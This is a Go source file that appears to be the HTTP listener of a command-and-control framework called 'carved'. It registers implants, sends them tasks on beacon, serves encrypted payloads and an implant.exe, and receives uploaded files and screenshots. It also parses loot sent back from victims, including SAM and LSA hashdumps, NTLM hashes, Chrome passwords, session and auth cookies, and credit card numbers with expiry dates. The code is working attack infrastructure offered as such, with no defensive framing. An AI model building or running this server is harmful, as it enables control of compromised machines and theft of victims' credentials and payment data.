package listeners

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/carved4/carved/server/pkg/db"
	"github.com/carved4/carved/shared/crypto"
	"github.com/carved4/carved/shared/proto"
)

type Manager struct {
	listeners map[string]*HTTPListener
	mu        sync.RWMutex
}

func NewManager() *Manager {
	return &Manager{
		listeners: make(map[string]*HTTPListener),
	}
}

type HTTPListener struct {
	config *db.Listener
	server *http.Server
	mux    *http.ServeMux
}

func (m *Manager) Start(l *db.Listener) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	if _, exists := m.listeners[l.ID]; exists {
		return fmt.Errorf("listener already running")
	}

	hl := &HTTPListener{
		config: l,
		mux:    http.NewServeMux(),
	}

	hl.mux.HandleFunc("/register", hl.handleRegister)
	hl.mux.HandleFunc("/beacon", hl.handleBeacon)
	hl.mux.HandleFunc("/payloads/", hl.handlePayload)
	hl.mux.HandleFunc("/upload", hl.handleUpload)
	hl.mux.HandleFunc("/screenshot", hl.handleScreenshot)
	hl.mux.HandleFunc("/implant", hl.handleImplant)

	hl.mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		fmt.Printf("[!] unmatched request: %s %s\n", r.Method, r.URL.Path)
		http.Error(w, "not found", http.StatusNotFound)
	})

	addr := fmt.Sprintf("%s:%d", l.Host, l.Port)
	hl.server = &http.Server{
		Addr:    addr,
		Handler: hl.mux,
	}

	go func() {
		certPath := "server.crt"
		keyPath := "server.key"

		// Check if TLS certificates exist
		_, certErr := os.Stat(certPath)
		_, keyErr := os.Stat(keyPath)

		var err error
		if certErr == nil && keyErr == nil {
			fmt.Printf("[+] started listener %s on %s (HTTPS)\n", l.Name, addr)
			err = hl.server.ListenAndServeTLS(certPath, keyPath)
		} else {
			fmt.Printf("[+] started listener %s on %s (HTTP)\n", l.Name, addr)
			err = hl.server.ListenAndServe()
		}
		if err != nil && err != http.ErrServerClosed {
			fmt.Printf("[!] listener %s error: %v\n", l.Name, err)
		}
	}()

	m.listeners[l.ID] = hl
	l.Active = true
	db.SaveListener(l)

	return nil
}

func (m *Manager) Stop(id string) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	hl, exists := m.listeners[id]
	if !exists {
		return fmt.Errorf("listener not found")
	}

	if err := hl.server.Close(); err != nil {
		return err
	}

	delete(m.listeners, id)

	hl.config.Active = false
	db.SaveListener(hl.config)

	fmt.Printf("[+] stopped listener %s\n", hl.config.Name)
	return nil
}

func (m *Manager) GetActive() []*db.Listener {
	m.mu.RLock()
	defer m.mu.RUnlock()

	var active []*db.Listener
	for _, hl := range m.listeners {
		active = append(active, hl.config)
	}
	return active
}

func (m *Manager) IsActive(id string) bool {
	m.mu.RLock()
	defer m.mu.RUnlock()
	_, exists := m.listeners[id]
	return exists
}

func (hl *HTTPListener) handleRegister(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	decrypted, err := crypto.Decrypt(body)
	if err != nil {
		fmt.Printf("[!] decrypt error: %v\n", err)
		http.Error(w, "decrypt failed", http.StatusBadRequest)
		return
	}

	var meta proto.ImplantMeta
	if err := json.Unmarshal(decrypted, &meta); err != nil {
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}

	if err := db.SaveImplant(&meta); err != nil {
		fmt.Printf("[!] failed to save implant: %v\n", err)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	fmt.Printf("[+] new implant: %s@%s (%s) pid:%d\n", meta.Username, meta.Hostname, meta.ID[:8], meta.PID)

	if imp, err := db.GetImplant(meta.ID); err != nil {
		fmt.Printf("[!] verify failed: %v\n", err)
	} else {
		fmt.Printf("[*] saved implant id: %s\n", imp.ID)
	}

	resp := []byte(`{"status":"ok"}`)
	encrypted, err := crypto.Encrypt(resp)
	if err != nil {
		fmt.Printf("[!] failed to encrypt response: %v\n", err)
		http.Error(w, "encrypt error", http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusOK)
	w.Write(encrypted)
}

func (hl *HTTPListener) handleBeacon(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	decrypted, err := crypto.Decrypt(body)
	if err != nil {
		fmt.Printf("[!] decrypt error: %v\n", err)
		http.Error(w, "decrypt failed", http.StatusBadRequest)
		return
	}

	var beacon proto.Beacon
	if err := json.Unmarshal(decrypted, &beacon); err != nil {
		fmt.Printf("[!] beacon parse error: %v\n", err)
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}

	if err := db.UpdateImplantLastSeen(beacon.ImplantID); err != nil {
		fmt.Printf("[!] update implant last seen error: %v\n", err)
	}

	if len(beacon.Results) > 0 {
		fmt.Printf("[*] received %d results from %s\n", len(beacon.Results), beacon.ImplantID[:8])
	}
	for _, result := range beacon.Results {
		if err := db.SaveTaskResult(result); err != nil {
			fmt.Printf("[!] save task result error for task %s: %v\n", result.TaskID[:8], err)
		} else {
			outputPreview := ""
			if len(result.Output) > 0 {
				outputPreview = fmt.Sprintf(" (%d bytes output)", len(result.Output))
			}
			if result.Error != "" {
				outputPreview = fmt.Sprintf(" (error: %s)", result.Error)
			}
			fmt.Printf("[+] task %s completed: %s%s\n", result.TaskID[:8], result.Status, outputPreview)
		}

		if result.Status == proto.StatusComplete && len(result.Output) > 0 {
			task, err := db.GetTask(result.TaskID)
			if err == nil && task != nil {
				if task.Type == proto.TaskHashdump {
					parseHashdumpCredentials(beacon.ImplantID, string(result.Output))
				} else if task.Type == proto.TaskChrome {
					parseChromeCredentials(beacon.ImplantID, result.Output)
				}
			}
		}
	}

	tasks, err := db.GetPendingTasks(beacon.ImplantID)
	if err != nil {
		fmt.Printf("[!] get pending tasks error: %v\n", err)
		tasks = []*proto.Task{}
	}

	if len(tasks) > 0 {
		fmt.Printf("[*] sending %d tasks to %s: ", len(tasks), beacon.ImplantID[:8])
		for i, t := range tasks {
			if i > 0 {
				fmt.Printf(", ")
			}
			fmt.Printf("%s(%s)", t.Type, t.ID[:8])
		}
		fmt.Println()
	}

	resp := proto.BeaconResponse{Tasks: tasks}
	respData, err := json.Marshal(resp)
	if err != nil {
		fmt.Printf("[!] failed to marshal beacon response: %v\n", err)
		http.Error(w, "marshal error", http.StatusInternalServerError)
		return
	}

	encrypted, err := crypto.Encrypt(respData)
	if err != nil {
		fmt.Printf("[!] failed to encrypt beacon response: %v\n", err)
		http.Error(w, "encrypt error", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	w.WriteHeader(http.StatusOK)
	w.Write(encrypted)
}

func getString(m map[string]interface{}, key string) string {
	if v, ok := m[key]; ok {
		if s, ok := v.(string); ok {
			return s
		}
	}
	return ""
}

func parseHashdumpCredentials(implantID string, output string) {
	lines := strings.Split(output, "\n")
	inSAMSection := false
	inLSASection := false
	var domain string
	var currentLSAName string
	var currentLSAType string

	for _, line := range lines {
		line = strings.TrimSpace(line)

		if strings.Contains(line, "domain:") {
			parts := strings.SplitN(line, "domain:", 2)
			if len(parts) == 2 {
				domainPart := strings.TrimSpace(parts[1])
				if idx := strings.Index(domainPart, " ("); idx != -1 {
					domainPart = domainPart[:idx]
				}
				domain = domainPart
			}
		}

		if strings.Contains(strings.ToLower(line), "sam credentials") {
			inSAMSection = true
			inLSASection = false
			continue
		}
		if strings.Contains(strings.ToLower(line), "lsa secrets") {
			inSAMSection = false
			inLSASection = true
			continue
		}

		if inSAMSection && line != "" && !strings.HasPrefix(line, "[") && !strings.HasPrefix(line, "=") {
			parts := strings.Split(line, ":")
			if len(parts) >= 3 {
				username := strings.TrimSpace(parts[0])
				nthash := strings.TrimSpace(parts[2])

				if nthash == "" || username == "" {
					continue
				}

				cred := &db.Credential{
					ImplantID: implantID,
					Source:    "hashdump/sam",
					Domain:    domain,
					Username:  username,
					Secret:    nthash,
					Type:      "ntlm",
					Created:   time.Now(),
				}
				if err := db.SaveCredential(cred); err != nil {
					fmt.Printf("[!] failed to save hashdump credential: %v\n", err)
				} else {
					fmt.Printf("[+] saved credential: %s\\%s\n", domain, username)
				}
			}
		}

		if inLSASection {
			if strings.HasPrefix(line, "[") && strings.Contains(line, "]") {
				start := strings.Index(line, "[") + 1
				end := strings.Index(line, "]")
				if start < end {
					currentLSAType = line[start:end]
					currentLSAName = strings.TrimSpace(line[end+1:])
				}
			} else if strings.HasPrefix(line, "password:") {
				password := strings.TrimSpace(strings.TrimPrefix(line, "password:"))
				if password != "" && currentLSAName != "" {
					cred := &db.Credential{
						ImplantID: implantID,
						Source:    "hashdump/lsa",
						Domain:    domain,
						Username:  currentLSAName,
						Secret:    password,
						Type:      currentLSAType,
						Created:   time.Now(),
					}
					if err := db.SaveCredential(cred); err != nil {
						fmt.Printf("[!] failed to save lsa credential: %v\n", err)
					} else {
						fmt.Printf("[+] saved lsa secret: %s (%s)\n", currentLSAName, currentLSAType)
					}
				}
			} else if strings.HasPrefix(line, "nthash:") {
				nthash := strings.TrimSpace(strings.TrimPrefix(line, "nthash:"))
				if nthash != "" && currentLSAName != "" {
					cred := &db.Credential{
						ImplantID: implantID,
						Source:    "hashdump/lsa",
						Domain:    domain,
						Username:  currentLSAName,
						Secret:    nthash,
						Type:      "ntlm",
						Created:   time.Now(),
					}
					if err := db.SaveCredential(cred); err != nil {
						fmt.Printf("[!] failed to save lsa nthash: %v\n", err)
					} else {
						fmt.Printf("[+] saved lsa nthash: %s\n", currentLSAName)
					}
				}
			}
		}
	}
}

func parseChromeCredentials(implantID string, output []byte) {
	var data map[string]interface{}
	if err := json.Unmarshal(output, &data); err != nil {
		fmt.Printf("[!] failed to parse chrome output as JSON: %v\n", err)
		return
	}

	savedCount := 0

	if passwords, ok := data["passwords"].([]interface{}); ok {
		for _, login := range passwords {
			if l, ok := login.(map[string]interface{}); ok {
				url := getString(l, "url")
				username := getString(l, "username")
				password := getString(l, "password")

				if username != "" && password != "" {
					cred := &db.Credential{
						ImplantID: implantID,
						Source:    "chrome/logins",
						Domain:    url,
						Username:  username,
						Secret:    password,
						Type:      "password",
						Created:   time.Now(),
					}
					if err := db.SaveCredential(cred); err == nil {
						savedCount++
					}
				}
			}
		}
	}

	// Parse cookies (save session cookies as credentials)
	if cookies, ok := data["cookies"].([]interface{}); ok {
		for _, cookie := range cookies {
			if c, ok := cookie.(map[string]interface{}); ok {
				host := getString(c, "host")
				name := getString(c, "name")
				value := getString(c, "value")

				// Only save important session cookies
				nameLower := strings.ToLower(name)
				if strings.Contains(nameLower, "session") || strings.Contains(nameLower, "auth") || strings.Contains(nameLower, "token") {
					cred := &db.Credential{
						ImplantID: implantID,
						Source:    "chrome/cookies",
						Domain:    host,
						Username:  name,
						Secret:    value,
						Type:      "cookie",
						Created:   time.Now(),
					}
					if err := db.SaveCredential(cred); err == nil {
						savedCount++
					}
				}
			}
		}
	}

	if cards, ok := data["cards"].([]interface{}); ok {
		for _, card := range cards {
			if c, ok := card.(map[string]interface{}); ok {
				name := getString(c, "name_on_card")
				number := getString(c, "number")
				expiration := getString(c, "expiration")

				if number != "" {
					secret := fmt.Sprintf("%s|%s", number, expiration)
					cred := &db.Credential{
						ImplantID: implantID,
						Source:    "chrome/cards",
						Domain:    "",
						Username:  name,
						Secret:    secret,
						Type:      "credit_card",
						Created:   time.Now(),
					}
					if err := db.SaveCredential(cred); err == nil {
						savedCount++
					}
				}
			}
		}
	}

	if savedCount > 0 {
		fmt.Printf("[+] parsed %d credentials from chrome extraction\n", savedCount)
	}
}

func (hl *HTTPListener) handleUpload(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	uploadType := r.Header.Get("X-Upload-Type")
	filename := r.Header.Get("X-Filename")
	implantID := r.Header.Get("X-Implant-ID")

	if filename == "" {
		filename = fmt.Sprintf("upload_%d", time.Now().Unix())
	}
	if uploadType == "" {
		uploadType = "file"
	}

	uploadDir := filepath.Join("uploads", uploadType+"s")
	if err := os.MkdirAll(uploadDir, 0755); err != nil {
		fmt.Printf("[!] failed to create upload dir: %v\n", err)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	savePath := filepath.Join(uploadDir, filename)
	if err := os.WriteFile(savePath, body, 0644); err != nil {
		fmt.Printf("[!] failed to save upload: %v\n", err)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	fmt.Printf("[+] received %s from %s: %s (%d bytes)\n", uploadType, implantID, filename, len(body))

	if uploadType == "screenshot" {
		loot := &db.Loot{
			ImplantID: implantID,
			Type:      db.LootScreenshot,
			Name:      filename,
			Data:      body,
			Created:   time.Now(),
		}
		if err := db.SaveLoot(loot); err != nil {
			fmt.Printf("[!] failed to save loot: %v\n", err)
		}
	}

	w.Header().Set("Content-Type", "text/plain")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("ok"))
}

func (hl *HTTPListener) handlePayload(w http.ResponseWriter, r *http.Request) {
	path := r.URL.Path
	if len(path) <= len("/payloads/") {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	filename := path[len("/payloads/"):]

	if filepath.Base(filename) != filename {
		http.Error(w, "invalid filename", http.StatusBadRequest)
		return
	}

	payloadPath := filepath.Join("payloads", filename)

	if _, err := os.Stat(payloadPath); os.IsNotExist(err) {
		fmt.Printf("[!] payload not found: %s\n", payloadPath)
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	data, err := os.ReadFile(payloadPath)
	if err != nil {
		fmt.Printf("[!] failed to read payload: %v\n", err)
		http.Error(w, "read error", http.StatusInternalServerError)
		return
	}

	encrypted, err := crypto.Encrypt(data)
	if err != nil {
		fmt.Printf("[!] failed to encrypt payload: %v\n", err)
		http.Error(w, "encrypt error", http.StatusInternalServerError)
		return
	}

	fmt.Printf("[*] serving payload %s (%d bytes)\n", filename, len(data))
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(encrypted)))
	w.WriteHeader(http.StatusOK)
	w.Write(encrypted)
}

func (hl *HTTPListener) handleScreenshot(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	if len(body) == 0 {
		http.Error(w, "empty body", http.StatusBadRequest)
		return
	}

	filename := fmt.Sprintf("screenshot_%d.jpg", time.Now().UnixNano())

	uploadDir := filepath.Join("uploads", "screenshots")
	if err := os.MkdirAll(uploadDir, 0755); err != nil {
		fmt.Printf("[!] failed to create screenshot dir: %v\n", err)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	savePath := filepath.Join(uploadDir, filename)
	if err := os.WriteFile(savePath, body, 0644); err != nil {
		fmt.Printf("[!] failed to save screenshot: %v\n", err)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	loot := &db.Loot{
		ImplantID: r.RemoteAddr,
		Type:      db.LootScreenshot,
		Name:      filename,
		Data:      body,
		Created:   time.Now(),
	}
	if err := db.SaveLoot(loot); err != nil {
		fmt.Printf("[!] failed to save screenshot to db: %v\n", err)
	}

	fmt.Printf("[+] received screenshot from %s: %s (%d bytes)\n", r.RemoteAddr, filename, len(body))

	w.Header().Set("Content-Type", "text/plain")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("ok"))
}

func (hl *HTTPListener) handleImplant(w http.ResponseWriter, r *http.Request) {
	implantPath := filepath.Join("payloads", "implant.exe")

	if _, err := os.Stat(implantPath); os.IsNotExist(err) {
		fmt.Printf("[!] implant not found: %s\n", implantPath)
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	data, err := os.ReadFile(implantPath)
	if err != nil {
		fmt.Printf("[!] failed to read implant: %v\n", err)
		http.Error(w, "read error", http.StatusInternalServerError)
		return
	}
	fmt.Printf("[*] serving implant.exe (%d bytes) to %s\n", len(data), r.RemoteAddr)
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(data)))
	w.WriteHeader(http.StatusOK)
	w.Write(data)
}
